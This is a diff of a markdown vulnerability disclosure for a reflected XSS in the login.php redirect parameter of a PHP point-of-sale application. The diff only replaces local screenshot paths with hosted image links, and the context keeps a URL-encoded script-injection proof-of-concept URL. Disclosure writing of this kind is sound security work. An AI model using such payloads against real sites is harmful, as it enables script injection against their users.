@@ -6,7 +6,8 @@ Vulnerability trigger parameter: $redirect
 
 The process of vulnerability discovery is as follows：
 
-![image-20230223211755472](C:\markdown\images\image-20230223211755472.png)
+![image](https://user-images.githubusercontent.com/30823782/220946674-d94e1d49-8edf-4b25-b768-9f68fb407756.png)
+
 
 exp
 
@@ -14,7 +15,8 @@ exp
 http://192.168.31.50/php-opos/login.php?redirect=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
 ```
 
-![image-20230223211644213](C:\markdown\images\image-20230223211644213.png)
+![image](https://user-images.githubusercontent.com/30823782/220946723-e20796d5-f4c0-4d26-8d77-9841fdb009e8.png)
+
 
 
 
